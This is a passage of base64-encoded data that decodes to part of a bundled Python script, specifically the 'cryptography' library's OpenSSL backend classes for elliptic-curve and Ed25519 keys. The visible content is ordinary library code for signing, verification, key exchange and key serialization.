tleS5fZWNfa2V5XHJcbiAgICApXHJcbiAgICBpZiByZXMgIT0gMTpcclxuICAgICAgICBiYWNrZW5kLl9jb25zdW1lX2Vycm9ycygpXHJcbiAgICAgICAgcmFpc2UgSW52YWxpZFNpZ25hdHVyZVxyXG5cclxuXHJcbmNsYXNzIF9FbGxpcHRpY0N1cnZlUHJpdmF0ZUtleShlYy5FbGxpcHRpY0N1cnZlUHJpdmF0ZUtleSk6XHJcbiAgICBkZWYgX19pbml0X18oc2VsZiwgYmFja2VuZDogIkJhY2tlbmQiLCBlY19rZXlfY2RhdGEsIGV2cF9wa2V5KTpcclxuICAgICAgICBzZWxmLl9iYWNrZW5kID0gYmFja2VuZFxyXG4gICAgICAgIHNlbGYuX2VjX2tleSA9IGVjX2tleV9jZGF0YVxyXG4gICAgICAgIHNlbGYuX2V2cF9wa2V5ID0gZXZwX3BrZXlcclxuXHJcbiAgICAgICAgc24gPSBfZWNfa2V5X2N1cnZlX3NuKGJhY2tlbmQsIGVjX2tleV9jZGF0YSlcclxuICAgICAgICBzZWxmLl9jdXJ2ZSA9IF9zbl90b19lbGxpcHRpY19jdXJ2ZShiYWNrZW5kLCBzbilcclxuICAgICAgICBfbWFya19hc24xX25hbWVkX2VjX2N1cnZlKGJhY2tlbmQsIGVjX2tleV9jZGF0YSlcclxuICAgICAgICBfY2hlY2tfa2V5X2luZmluaXR5KGJhY2tlbmQsIGVjX2tleV9jZGF0YSlcclxuXHJcbiAgICBAcHJvcGVydHlcclxuICAgIGRlZiBjdXJ2ZShzZWxmKSAtPiBlYy5FbGxpcHRpY0N1cnZlOlxyXG4gICAgICAgIHJldHVybiBzZWxmLl9jdXJ2ZVxyXG5cclxuICAgIEBwcm9wZXJ0eVxyXG4gICAgZGVmIGtleV9zaXplKHNlbGYpIC0+IGludDpcclxuICAgICAgICByZXR1cm4gc2VsZi5jdXJ2ZS5rZXlfc2l6ZVxyXG5cclxuICAgIGRlZiBleGNoYW5nZShcclxuICAgICAgICBzZWxmLCBhbGdvcml0aG06IGVjLkVDREgsIHBlZXJfcHVibGljX2tleTogZWMuRWxsaXB0aWNDdXJ2ZVB1YmxpY0tleVxyXG4gICAgKSAtPiBieXRlczpcclxuICAgICAgICBpZiBub3QgKFxyXG4gICAgICAgICAgICBzZWxmLl9iYWNrZW5kLmVsbGlwdGljX2N1cnZlX2V4Y2hhbmdlX2FsZ29yaXRobV9zdXBwb3J0ZWQoXHJcbiAgICAgICAgICAgICAgICBhbGdvcml0aG0sIHNlbGYuY3VydmVcclxuICAgICAgICAgICAgKVxyXG4gICAgICAgICk6XHJcbiAgICAgICAgICAgIHJhaXNlIFVuc3VwcG9ydGVkQWxnb3JpdGhtKFxyXG4gICAgICAgICAgICAgICAgIlRoaXMgYmFja2VuZCBkb2VzIG5vdCBzdXBwb3J0IHRoZSBFQ0RIIGFsZ29yaXRobS4iLFxyXG4gICAgICAgICAgICAgICAgX1JlYXNvbnMuVU5TVVBQT1JURURfRVhDSEFOR0VfQUxHT1JJVEhNLFxyXG4gICAgICAgICAgICApXHJcblxyXG4gICAgICAgIGlmIHBlZXJfcHVibGljX2tleS5jdXJ2ZS5uYW1lICE9IHNlbGYuY3VydmUubmFtZTpcclxuICAgICAgICAgICAgcmFpc2UgVmFsdWVFcnJvcihcclxuICAgICAgICAgICAgICAgICJwZWVyX3B1YmxpY19rZXkgYW5kIHNlbGYgYXJlIG5vdCBvbiB0aGUgc2FtZSBjdXJ2ZSJcclxuICAgICAgICAgICAgKVxyXG5cclxuICAgICAgICByZXR1cm4gX2V2cF9wa2V5X2Rlcml2ZShzZWxmLl9iYWNrZW5kLCBzZWxmLl9ldnBfcGtleSwgcGVlcl9wdWJsaWNfa2V5KVxyXG5cclxuICAgIGRlZiBwdWJsaWNfa2V5KHNlbGYpIC0+IGVjLkVsbGlwdGljQ3VydmVQdWJsaWNLZXk6XHJcbiAgICAgICAgZ3JvdXAgPSBzZWxmLl9iYWNrZW5kLl9saWIuRUNfS0VZX2dldDBfZ3JvdXAoc2VsZi5fZWNfa2V5KVxyXG4gICAgICAgIHNlbGYuX2JhY2tlbmQub3BlbnNzbF9hc3NlcnQoZ3JvdXAgIT0gc2VsZi5fYmFja2VuZC5fZmZpLk5VTEwpXHJcblxyXG4gICAgICAgIGN1cnZlX25pZCA9IHNlbGYuX2JhY2tlbmQuX2xpYi5FQ19HUk9VUF9nZXRfY3VydmVfbmFtZShncm91cClcclxuICAgICAgICBwdWJsaWNfZWNfa2V5ID0gc2VsZi5fYmFja2VuZC5fZWNfa2V5X25ld19ieV9jdXJ2ZV9uaWQoY3VydmVfbmlkKVxyXG5cclxuICAgICAgICBwb2ludCA9IHNlbGYuX2JhY2tlbmQuX2xpYi5FQ19LRVlfZ2V0MF9wdWJsaWNfa2V5KHNlbGYuX2VjX2tleSlcclxuICAgICAgICBzZWxmLl9iYWNrZW5kLm9wZW5zc2xfYXNzZXJ0KHBvaW50ICE9IHNlbGYuX2JhY2tlbmQuX2ZmaS5OVUxMKVxyXG5cclxuICAgICAgICByZXMgPSBzZWxmLl9iYWNrZW5kLl9saWIuRUNfS0VZX3NldF9wdWJsaWNfa2V5KHB1YmxpY19lY19rZXksIHBvaW50KVxyXG4gICAgICAgIHNlbGYuX2JhY2tlbmQub3BlbnNzbF9hc3NlcnQocmVzID09IDEpXHJcblxyXG4gICAgICAgIGV2cF9wa2V5ID0gc2VsZi5fYmFja2VuZC5fZWNfY2RhdGFfdG9fZXZwX3BrZXkocHVibGljX2VjX2tleSlcclxuXHJcbiAgICAgICAgcmV0dXJuIF9FbGxpcHRpY0N1cnZlUHVibGljS2V5KHNlbGYuX2JhY2tlbmQsIHB1YmxpY19lY19rZXksIGV2cF9wa2V5KVxyXG5cclxuICAgIGRlZiBwcml2YXRlX251bWJlcnMoc2VsZikgLT4gZWMuRWxsaXB0aWNDdXJ2ZVByaXZhdGVOdW1iZXJzOlxyXG4gICAgICAgIGJuID0gc2VsZi5fYmFja2VuZC5fbGliLkVDX0tFWV9nZXQwX3ByaXZhdGVfa2V5KHNlbGYuX2VjX2tleSlcclxuICAgICAgICBwcml2YXRlX3ZhbHVlID0gc2VsZi5fYmFja2VuZC5fYm5fdG9faW50KGJuKVxyXG4gICAgICAgIHJldHVybiBlYy5FbGxpcHRpY0N1cnZlUHJpdmF0ZU51bWJlcnMoXHJcbiAgICAgICAgICAgIHByaXZhdGVfdmFsdWU9cHJpdmF0ZV92YWx1ZSxcclxuICAgICAgICAgICAgcHVibGljX251bWJlcnM9c2VsZi5wdWJsaWNfa2V5KCkucHVibGljX251bWJlcnMoKSxcclxuICAgICAgICApXHJcblxyXG4gICAgZGVmIHByaXZhdGVfYnl0ZXMoXHJcbiAgICAgICAgc2VsZixcclxuICAgICAgICBlbmNvZGluZzogc2VyaWFsaXphdGlvbi5FbmNvZGluZyxcclxuICAgICAgICBmb3JtYXQ6IHNlcmlhbGl6YXRpb24uUHJpdmF0ZUZvcm1hdCxcclxuICAgICAgICBlbmNyeXB0aW9uX2FsZ29yaXRobTogc2VyaWFsaXphdGlvbi5LZXlTZXJpYWxpemF0aW9uRW5jcnlwdGlvbixcclxuICAgICkgLT4gYnl0ZXM6XHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX2JhY2tlbmQuX3ByaXZhdGVfa2V5X2J5dGVzKFxyXG4gICAgICAgICAgICBlbmNvZGluZyxcclxuICAgICAgICAgICAgZm9ybWF0LFxyXG4gICAgICAgICAgICBlbmNyeXB0aW9uX2FsZ29yaXRobSxcclxuICAgICAgICAgICAgc2VsZixcclxuICAgICAgICAgICAgc2VsZi5fZXZwX3BrZXksXHJcbiAgICAgICAgICAgIHNlbGYuX2VjX2tleSxcclxuICAgICAgICApXHJcblxyXG4gICAgZGVmIHNpZ24oXHJcbiAgICAgICAgc2VsZixcclxuICAgICAgICBkYXRhOiBieXRlcyxcclxuICAgICAgICBzaWduYXR1cmVfYWxnb3JpdGhtOiBlYy5FbGxpcHRpY0N1cnZlU2lnbmF0dXJlQWxnb3JpdGhtLFxyXG4gICAgKSAtPiBieXRlczpcclxuICAgICAgICBfY2hlY2tfc2lnbmF0dXJlX2FsZ29yaXRobShzaWduYXR1cmVfYWxnb3JpdGhtKVxyXG4gICAgICAgIGRhdGEsIF8gPSBfY2FsY3VsYXRlX2RpZ2VzdF9hbmRfYWxnb3JpdGhtKFxyXG4gICAgICAgICAgICBkYXRhLFxyXG4gICAgICAgICAgICBzaWduYXR1cmVfYWxnb3JpdGhtLmFsZ29yaXRobSxcclxuICAgICAgICApXHJcbiAgICAgICAgcmV0dXJuIF9lY2RzYV9zaWdfc2lnbihzZWxmLl9iYWNrZW5kLCBzZWxmLCBkYXRhKVxyXG5cclxuXHJcbmNsYXNzIF9FbGxpcHRpY0N1cnZlUHVibGljS2V5KGVjLkVsbGlwdGljQ3VydmVQdWJsaWNLZXkpOlxyXG4gICAgZGVmIF9faW5pdF9fKHNlbGYsIGJhY2tlbmQ6ICJCYWNrZW5kIiwgZWNfa2V5X2NkYXRhLCBldnBfcGtleSk6XHJcbiAgICAgICAgc2VsZi5fYmFja2VuZCA9IGJhY2tlbmRcclxuICAgICAgICBzZWxmLl9lY19rZXkgPSBlY19rZXlfY2RhdGFcclxuICAgICAgICBzZWxmLl9ldnBfcGtleSA9IGV2cF9wa2V5XHJcblxyXG4gICAgICAgIHNuID0gX2VjX2tleV9jdXJ2ZV9zbihiYWNrZW5kLCBlY19rZXlfY2RhdGEpXHJcbiAgICAgICAgc2VsZi5fY3VydmUgPSBfc25fdG9fZWxsaXB0aWNfY3VydmUoYmFja2VuZCwgc24pXHJcbiAgICAgICAgX21hcmtfYXNuMV9uYW1lZF9lY19jdXJ2ZShiYWNrZW5kLCBlY19rZXlfY2RhdGEpXHJcbiAgICAgICAgX2NoZWNrX2tleV9pbmZpbml0eShiYWNrZW5kLCBlY19rZXlfY2RhdGEpXHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBkZWYgY3VydmUoc2VsZikgLT4gZWMuRWxsaXB0aWNDdXJ2ZTpcclxuICAgICAgICByZXR1cm4gc2VsZi5fY3VydmVcclxuXHJcbiAgICBAcHJvcGVydHlcclxuICAgIGRlZiBrZXlfc2l6ZShzZWxmKSAtPiBpbnQ6XHJcbiAgICAgICAgcmV0dXJuIHNlbGYuY3VydmUua2V5X3NpemVcclxuXHJcbiAgICBkZWYgcHVibGljX251bWJlcnMoc2VsZikgLT4gZWMuRWxsaXB0aWNDdXJ2ZVB1YmxpY051bWJlcnM6XHJcbiAgICAgICAgZ2V0X2Z1bmMsIGdyb3VwID0gc2VsZi5fYmFja2VuZC5fZWNfa2V5X2RldGVybWluZV9ncm91cF9nZXRfZnVuYyhcclxuICAgICAgICAgICAgc2VsZi5fZWNfa2V5XHJcbiAgICAgICAgKVxyXG4gICAgICAgIHBvaW50ID0gc2VsZi5fYmFja2VuZC5fbGliLkVDX0tFWV9nZXQwX3B1YmxpY19rZXkoc2VsZi5fZWNfa2V5KVxyXG4gICAgICAgIHNlbGYuX2JhY2tlbmQub3BlbnNzbF9hc3NlcnQocG9pbnQgIT0gc2VsZi5fYmFja2VuZC5fZmZpLk5VTEwpXHJcblxyXG4gICAgICAgIHdpdGggc2VsZi5fYmFja2VuZC5fdG1wX2JuX2N0eCgpIGFzIGJuX2N0eDpcclxuICAgICAgICAgICAgYm5feCA9IHNlbGYuX2JhY2tlbmQuX2xpYi5CTl9DVFhfZ2V0KGJuX2N0eClcclxuICAgICAgICAgICAgYm5feSA9IHNlbGYuX2JhY2tlbmQuX2xpYi5CTl9DVFhfZ2V0KGJuX2N0eClcclxuXHJcbiAgICAgICAgICAgIHJlcyA9IGdldF9mdW5jKGdyb3VwLCBwb2ludCwgYm5feCwgYm5feSwgYm5fY3R4KVxyXG4gICAgICAgICAgICBzZWxmLl9iYWNrZW5kLm9wZW5zc2xfYXNzZXJ0KHJlcyA9PSAxKVxyXG5cclxuICAgICAgICAgICAgeCA9IHNlbGYuX2JhY2tlbmQuX2JuX3RvX2ludChibl94KVxyXG4gICAgICAgICAgICB5ID0gc2VsZi5fYmFja2VuZC5fYm5fdG9faW50KGJuX3kpXHJcblxyXG4gICAgICAgIHJldHVybiBlYy5FbGxpcHRpY0N1cnZlUHVibGljTnVtYmVycyh4PXgsIHk9eSwgY3VydmU9c2VsZi5fY3VydmUpXHJcblxyXG4gICAgZGVmIF9lbmNvZGVfcG9pbnQoc2VsZiwgZm9ybWF0OiBzZXJpYWxpemF0aW9uLlB1YmxpY0Zvcm1hdCkgLT4gYnl0ZXM6XHJcbiAgICAgICAgaWYgZm9ybWF0IGlzIHNlcmlhbGl6YXRpb24uUHVibGljRm9ybWF0LkNvbXByZXNzZWRQb2ludDpcclxuICAgICAgICAgICAgY29udmVyc2lvbiA9IHNlbGYuX2JhY2tlbmQuX2xpYi5QT0lOVF9DT05WRVJTSU9OX0NPTVBSRVNTRURcclxuICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICBhc3NlcnQgZm9ybWF0IGlzIHNlcmlhbGl6YXRpb24uUHVibGljRm9ybWF0LlVuY29tcHJlc3NlZFBvaW50XHJcbiAgICAgICAgICAgIGNvbnZlcnNpb24gPSBzZWxmLl9iYWNrZW5kLl9saWIuUE9JTlRfQ09OVkVSU0lPTl9VTkNPTVBSRVNTRURcclxuXHJcbiAgICAgICAgZ3JvdXAgPSBzZWxmLl9iYWNrZW5kLl9saWIuRUNfS0VZX2dldDBfZ3JvdXAoc2VsZi5fZWNfa2V5KVxyXG4gICAgICAgIHNlbGYuX2JhY2tlbmQub3BlbnNzbF9hc3NlcnQoZ3JvdXAgIT0gc2VsZi5fYmFja2VuZC5fZmZpLk5VTEwpXHJcbiAgICAgICAgcG9pbnQgPSBzZWxmLl9iYWNrZW5kLl9saWIuRUNfS0VZX2dldDBfcHVibGljX2tleShzZWxmLl9lY19rZXkpXHJcbiAgICAgICAgc2VsZi5fYmFja2VuZC5vcGVuc3NsX2Fzc2VydChwb2ludCAhPSBzZWxmLl9iYWNrZW5kLl9mZmkuTlVMTClcclxuICAgICAgICB3aXRoIHNlbGYuX2JhY2tlbmQuX3RtcF9ibl9jdHgoKSBhcyBibl9jdHg6XHJcbiAgICAgICAgICAgIGJ1ZmxlbiA9IHNlbGYuX2JhY2tlbmQuX2xpYi5FQ19QT0lOVF9wb2ludDJvY3QoXHJcbiAgICAgICAgICAgICAgICBncm91cCwgcG9pbnQsIGNvbnZlcnNpb24sIHNlbGYuX2JhY2tlbmQuX2ZmaS5OVUxMLCAwLCBibl9jdHhcclxuICAgICAgICAgICAgKVxyXG4gICAgICAgICAgICBzZWxmLl9iYWNrZW5kLm9wZW5zc2xfYXNzZXJ0KGJ1ZmxlbiA+IDApXHJcbiAgICAgICAgICAgIGJ1ZiA9IHNlbGYuX2JhY2tlbmQuX2ZmaS5uZXcoImNoYXJbXSIsIGJ1ZmxlbilcclxuICAgICAgICAgICAgcmVzID0gc2VsZi5fYmFja2VuZC5fbGliLkVDX1BPSU5UX3BvaW50Mm9jdChcclxuICAgICAgICAgICAgICAgIGdyb3VwLCBwb2ludCwgY29udmVyc2lvbiwgYnVmLCBidWZsZW4sIGJuX2N0eFxyXG4gICAgICAgICAgICApXHJcbiAgICAgICAgICAgIHNlbGYuX2JhY2tlbmQub3BlbnNzbF9hc3NlcnQoYnVmbGVuID09IHJlcylcclxuXHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX2JhY2tlbmQuX2ZmaS5idWZmZXIoYnVmKVs6XVxyXG5cclxuICAgIGRlZiBwdWJsaWNfYnl0ZXMoXHJcbiAgICAgICAgc2VsZixcclxuICAgICAgICBlbmNvZGluZzogc2VyaWFsaXphdGlvbi5FbmNvZGluZyxcclxuICAgICAgICBmb3JtYXQ6IHNlcmlhbGl6YXRpb24uUHVibGljRm9ybWF0LFxyXG4gICAgKSAtPiBieXRlczpcclxuICAgICAgICBpZiAoXHJcbiAgICAgICAgICAgIGVuY29kaW5nIGlzIHNlcmlhbGl6YXRpb24uRW5jb2RpbmcuWDk2MlxyXG4gICAgICAgICAgICBvciBmb3JtYXQgaXMgc2VyaWFsaXphdGlvbi5QdWJsaWNGb3JtYXQuQ29tcHJlc3NlZFBvaW50XHJcbiAgICAgICAgICAgIG9yIGZvcm1hdCBpcyBzZXJpYWxpemF0aW9uLlB1YmxpY0Zvcm1hdC5VbmNvbXByZXNzZWRQb2ludFxyXG4gICAgICAgICk6XHJcbiAgICAgICAgICAgIGlmIGVuY29kaW5nIGlzIG5vdCBzZXJpYWxpemF0aW9uLkVuY29kaW5nLlg5NjIgb3IgZm9ybWF0IG5vdCBpbiAoXHJcbiAgICAgICAgICAgICAgICBzZXJpYWxpemF0aW9uLlB1YmxpY0Zvcm1hdC5Db21wcmVzc2VkUG9pbnQsXHJcbiAgICAgICAgICAgICAgICBzZXJpYWxpemF0aW9uLlB1YmxpY0Zvcm1hdC5VbmNvbXByZXNzZWRQb2ludCxcclxuICAgICAgICAgICAgKTpcclxuICAgICAgICAgICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoXHJcbiAgICAgICAgICAgICAgICAgICAgIlg5NjIgZW5jb2RpbmcgbXVzdCBiZSB1c2VkIHdpdGggQ29tcHJlc3NlZFBvaW50IG9yICJcclxuICAgICAgICAgICAgICAgICAgICAiVW5jb21wcmVzc2VkUG9pbnQgZm9ybWF0IlxyXG4gICAgICAgICAgICAgICAgKVxyXG5cclxuICAgICAgICAgICAgcmV0dXJuIHNlbGYuX2VuY29kZV9wb2ludChmb3JtYXQpXHJcbiAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgcmV0dXJuIHNlbGYuX2JhY2tlbmQuX3B1YmxpY19rZXlfYnl0ZXMoXHJcbiAgICAgICAgICAgICAgICBlbmNvZGluZywgZm9ybWF0LCBzZWxmLCBzZWxmLl9ldnBfcGtleSwgTm9uZVxyXG4gICAgICAgICAgICApXHJcblxyXG4gICAgZGVmIHZlcmlmeShcclxuICAgICAgICBzZWxmLFxyXG4gICAgICAgIHNpZ25hdHVyZTogYnl0ZXMsXHJcbiAgICAgICAgZGF0YTogYnl0ZXMsXHJcbiAgICAgICAgc2lnbmF0dXJlX2FsZ29yaXRobTogZWMuRWxsaXB0aWNDdXJ2ZVNpZ25hdHVyZUFsZ29yaXRobSxcclxuICAgICkgLT4gTm9uZTpcclxuICAgICAgICBfY2hlY2tfc2lnbmF0dXJlX2FsZ29yaXRobShzaWduYXR1cmVfYWxnb3JpdGhtKVxyXG4gICAgICAgIGRhdGEsIF8gPSBfY2FsY3VsYXRlX2RpZ2VzdF9hbmRfYWxnb3JpdGhtKFxyXG4gICAgICAgICAgICBkYXRhLFxyXG4gICAgICAgICAgICBzaWduYXR1cmVfYWxnb3JpdGhtLmFsZ29yaXRobSxcclxuICAgICAgICApXHJcbiAgICAgICAgX2VjZHNhX3NpZ192ZXJpZnkoc2VsZi5fYmFja2VuZCwgc2VsZiwgc2lnbmF0dXJlLCBkYXRhKVxyXG4nKQogICAgX19zdGlja3l0YXBlX3dyaXRlX21vZHVsZSgnY3J5cHRvZ3JhcGh5L2hhem1hdC9iYWNrZW5kcy9vcGVuc3NsL2VkMjU1MTkucHknLCBiJyMgVGhpcyBmaWxlIGlzIGR1YWwgbGljZW5zZWQgdW5kZXIgdGhlIHRlcm1zIG9mIHRoZSBBcGFjaGUgTGljZW5zZSwgVmVyc2lvblxyXG4jIDIuMCwgYW5kIHRoZSBCU0QgTGljZW5zZS4gU2VlIHRoZSBMSUNFTlNFIGZpbGUgaW4gdGhlIHJvb3Qgb2YgdGhpcyByZXBvc2l0b3J5XHJcbiMgZm9yIGNvbXBsZXRlIGRldGFpbHMuXHJcblxyXG5pbXBvcnQgdHlwaW5nXHJcblxyXG5mcm9tIGNyeXB0b2dyYXBoeSBpbXBvcnQgZXhjZXB0aW9uc1xyXG5mcm9tIGNyeXB0b2dyYXBoeS5oYXptYXQucHJpbWl0aXZlcyBpbXBvcnQgc2VyaWFsaXphdGlvblxyXG5mcm9tIGNyeXB0b2dyYXBoeS5oYXptYXQucHJpbWl0aXZlcy5hc3ltbWV0cmljLmVkMjU1MTkgaW1wb3J0IChcclxuICAgIEVkMjU1MTlQcml2YXRlS2V5LFxyXG4gICAgRWQyNTUxOVB1YmxpY0tleSxcclxuICAgIF9FRDI1NTE5X0tFWV9TSVpFLFxyXG4gICAgX0VEMjU1MTlfU0lHX1NJWkUsXHJcbilcclxuXHJcbmlmIHR5cGluZy5UWVBFX0NIRUNLSU5HOlxyXG4gICAgZnJvbSBjcnlwdG9ncmFwaHkuaGF6bWF0LmJhY2tlbmRzLm9wZW5zc2wuYmFja2VuZCBpbXBvcnQgQmFja2VuZFxyXG5cclxuXHJcbmNsYXNzIF9FZDI1NTE5UHVibGljS2V5KEVkMjU1MTlQdWJsaWNLZXkpOlxyXG4gICAgZGVmIF9faW5pdF9fKHNlbGYsIGJhY2tlbmQ6ICJCYWNrZW5kIiwgZXZwX3BrZXkpOlxyXG4gICAgICAgIHNlbGYuX2JhY2tlbmQgPSBiYWNrZW5kXHJcbiAgICAgICAgc2VsZi5fZXZwX3BrZXkgPSBldnBfcGtleVxyXG5cclxuICAgIGRlZiBwdWJsaWNfYnl0ZXMoXHJcbiAgICAgICAgc2VsZixcclxuICAgICAgICBlbmNvZGluZzogc2VyaWFsaXphdGlvbi5FbmNvZGluZyxcclxuICAgICAgICBmb3JtYXQ6IHNlcmlhbGl6YXRpb24uUHVibGljRm9ybWF0LFxyXG4gICAgKSAtPiBieXRlczpcclxuICAgICAgICBpZiAoXHJcbiAgICAgICAgICAgIGVuY29kaW5nIGlzIHNlcmlhbGl6YXRpb24uRW5jb2RpbmcuUmF3XHJcbiAgICAgICAgICAgIG9yIGZvcm1hdCBpcyBzZXJpYWxpemF0aW9uLlB1YmxpY0Zvcm1hdC5SYXdcclxuICAgICAgICApOlxyXG4gICAgICAgICAgICBpZiAoXHJcbiAgICAgICAgICAgICAgICBlbmNvZGluZyBpcyBub3Qgc2VyaWFsaXphdGlvbi5FbmNvZGluZy5SYXdcclxuICAgICAgICAgICAgICAgIG9yIGZvcm1hdCBpcyBub3Qgc2VyaWFsaXphdGlvbi5QdWJsaWNGb3JtYXQuUmF3XHJcbiAgICAgICAgICAgICk6XHJcbiAgICAgICAgICAgICAgICByYWlzZSBWYWx1ZUVycm9yKFxyXG4gICAgICAgICAgICAgICAgICAgICJXaGVuIHVzaW5nIFJhdyBib3RoIGVuY29kaW5nIGFuZCBmb3JtYXQgbXVzdCBiZSBSYXciXHJcbiAgICAgICAgICAgICAgICApXHJcblxyXG4gICAgICAgICAgICByZXR1cm4gc2VsZi5fcmF3X3B1YmxpY19ieXRlcygpXHJcblxyXG4gICAgICAgIHJldHVybiBzZWxmLl9iYWNrZW5kLl9wdWJsaWNfa2V5X2J5dGVzKFxyXG4gICAgICAgICAgICBlbmNvZGluZywgZm9ybWF0LCBzZWxmLCBzZWxmLl9ldnBfcGtleSwgTm9uZVxyXG4gICAgICAgIClcclxuXHJcbiAgICBkZWYgX3Jhd19wdWJsaWNfYnl0ZXMoc2VsZikgLT4gYnl0ZXM6XHJcbiAgICAgICAgYnVmID0gc2VsZi5fYmFja2VuZC5fZmZpLm5ldygidW5zaWduZWQgY2hhciBbXSIsIF9FRDI1NTE5X0tFWV9TSVpFKVxyXG4gICAgICAgIGJ1ZmxlbiA9IHNlbGYuX2JhY2tlbmQuX2ZmaS5uZXcoInNpemVfdCAqIiwgX0VEMjU1MTlfS0VZX1NJWkUpXHJcbiAgICAgICAgcmVzID0gc2VsZi5fYmFja2VuZC5fbGliLkVWUF9QS0VZX2dldF9yYXdfcHVibGljX2tleShcclxuICAgICAgICAgICAgc2VsZi5fZXZwX3BrZXksIGJ1ZiwgYnVmbGVuXHJcbiAgICAgICAgKVxyXG4gICAgICAgIHNlbGYuX2JhY2tlbmQub3BlbnNzbF9hc3NlcnQocmVzID09IDEpXHJcbiAgICAgICAgc2VsZi5fYmFja2VuZC5vcGVuc3NsX2Fzc2VydChidWZsZW5bMF0gPT0gX0VEMjU1MTlfS0VZX1NJWkUpXHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX2JhY2tlbmQuX2ZmaS5idWZmZXIoYnVmLCBfRUQyNTUxOV9LRVlfU0laRSlbOl1cclxuXHJcbiAgICBkZWYgdmVyaWZ5KHNlbGYsIHNpZ25hdHVyZTogYnl0ZXMsIGRhdGE6IGJ5dGVzKSAtPiBOb25lOlxyXG4gICAgICAgIGV2cF9tZF9jdHggPSBzZWxmLl9iYWNrZW5kLl9saWIuRVZQX01EX0NUWF9uZXcoKVxyXG4gICAgICAgIHNlbGYuX2JhY2tlbmQub3BlbnNzbF9hc3NlcnQoZXZwX21kX2N0eCAhPSBzZWxmLl9iYWNrZW5kLl9mZmkuTlVMTClcclxuICAgICAgICBldnBfbWRfY3R4ID0gc2VsZi5fYmFja2VuZC5fZmZpLmdjKFxyXG4gICAgICAgICAgICBldnBfbWRfY3R4LCBzZWxmLl9iYWNrZW5kLl9saWIuRVZQX01EX0NUWF9mcmVlXHJcbiAgICAgICAgKVxyXG4gICAgICAgIHJlcyA9IHNlbGYuX2JhY2tlbmQuX2xpYi5FVlBfRGlnZXN0VmVyaWZ5SW5pdChcclxuICAgICAgICAgICAgZXZwX21kX2N0eCxcclxuICAgICAgICAgICAgc2VsZi5fYmFja2VuZC5fZmZpLk5VTEwsXHJcbiAgICAgICAgICAgIHNlbGYuX2JhY2tlbmQuX2ZmaS5OVUxMLFxyXG4gICAgICAgICAgICBzZWxmLl9iYWNrZW5kLl9mZmkuTlVMTCxcclxuICAgICAgICAgICAgc2VsZi5fZXZwX3BrZXksXHJcbiAgICAgICAgKVxyXG4gICAgICAgIHNlbGYuX2JhY2tlbmQub3BlbnNzbF9hc3NlcnQocmVzID09IDEpXHJcbiAgICAgICAgcmVzID0gc2VsZi5fYmFja2VuZC5fbGliLkVWUF9EaWdlc3RWZXJpZnkoXHJcbiAgICAgICAgICAgIGV2cF9tZF9jdHgsIHNpZ25hdHVyZSwgbGVuKHNpZ25hdHVyZSksIGRhdGEsIGxlbihkYXRhKVxyXG4gICAgICAgIClcclxuICAgICAgICBpZiByZXMgIT0gMTpcclxuICAgICAgICAgICAgc2VsZi5fYmFja2VuZC5fY29uc3VtZV9lcnJvcnMoKVxyXG4gICAgICAgICAgICByYWlzZSBleGNlcHRpb25zLkludmFsaWRTaWduYXR1cmVcclxuXHJcblxyXG5jbGFzcyBfRWQyNTUxOVByaXZhdGVLZXkoRWQyNTUxOVByaXZhdGVLZXkpOlxyXG4gICAgZGVmIF9faW5pdF9fKHNlbGYsIGJhY2tlbmQ6ICJCYWNrZW5kIiwgZXZwX3BrZXkpOlxyXG4gICAgICAgIHNlbGYuX2JhY2tlbmQgPSBiYWNrZW5kXHJcbiAgICAgICAgc2VsZi5fZXZwX3BrZXkgPSBldnBfcGtleVxyXG5cclxuICAgIGRlZiBwdWJsaWNfa2V5KHNlbGYpIC0+IEVkMjU1MTlQdWJsaWNLZXk6XHJcbiAgICAgICAgYnVmID0gc2VsZi5fYmFja2VuZC5fZmZpLm5ldygidW5zaWduZWQgY2hhciBbXSIsIF9FRDI1NTE5X0tFWV9TSVpFKVxyXG4gICAgICAgIGJ1ZmxlbiA9IHNlbGYuX2JhY2tlbmQuX2ZmaS5uZXcoInNpemVfdCAqIiwgX0VEMjU1MTlfS0VZX1NJWkUpXHJcbiAgICAgICAgcmVzID0gc2VsZi5fYmFja2VuZC5fbGliLkVWUF9QS0VZX2dldF9yYXdfcHVibGljX2tleShcclxuICAgICAgICAgICAgc2VsZi5fZXZwX3BrZXksIGJ1ZiwgYnVmbGVuXHJcbiAgICAgICAgKVxyXG4gICAgICAgIHNlbGYuX2JhY2tlbmQub3BlbnNzbF9hc3NlcnQocmVzID09IDEpXHJcbiAgICAgICAgc2VsZi5fYmFja2VuZC5vcGVuc3NsX2Fzc2VydChidWZsZW5bMF0gPT0gX0VEMjU1MTlfS0VZX1NJWkUpXHJcbiAgICAgICAgcHVibGljX2J5dGVzID0gc2VsZi5fYmFja2VuZC5fZmZpLmJ1ZmZlcihidWYpWzpdXHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX2JhY2tlbmQuZWQyNTUxOV9sb2FkX3B1YmxpY19ieXRlcyhwdWJsaWNfYnl0ZXMpXHJcblxyXG4gICAgZGVmIHNpZ24oc2VsZiwgZGF0YTogYnl0ZXMpIC0+IGJ5dGVzOlxyXG4gICAgICAgIGV2cF9tZF9jdHggPSBzZWxmLl9iYWNrZW5kLl9saWIuRVZQX01EX0NUWF9uZXcoKVxyXG4gICAgICAgIHNlbGYuX2JhY2tlbmQub3BlbnNzbF9hc3NlcnQoZXZwX21kX2N0eCAhPSBzZWxmLl9iYWNrZW5kLl9mZmkuTlVMTClcclxuICAgICAgICBldnBfbWRfY3R4ID0gc2VsZi5fYmFja2VuZC5fZmZpLmdjKFxyXG4gICAgICAgICAgICBldnBfbWRfY3R4LCBzZWxmLl9iYWNrZW5kLl9saWIuRVZQX01EX0NUWF9mcmVlXHJcbiAgICAgICAgKVxyXG4gICAgICAgIHJlcyA9IHNlbGYuX2JhY2tlbmQuX2xpYi5FVlBfRGlnZXN0U2lnbkluaXQoXHJcbiAgICAgICAgICAgIGV2cF9tZF9jdHgsXHJcbiAgICAgICAgICAgIHNlbGYuX2JhY2tlbmQuX2ZmaS5OVUxMLFxyXG4gICAgICAgICAgICBzZWxmLl9iYWNrZW5kLl9mZmkuTlVMTCxcclxuICAgICAgICAgICAgc2VsZi5fYmFja2VuZC5fZmZpLk5VTEwsXHJcbiAgICAgICAgICAgIHN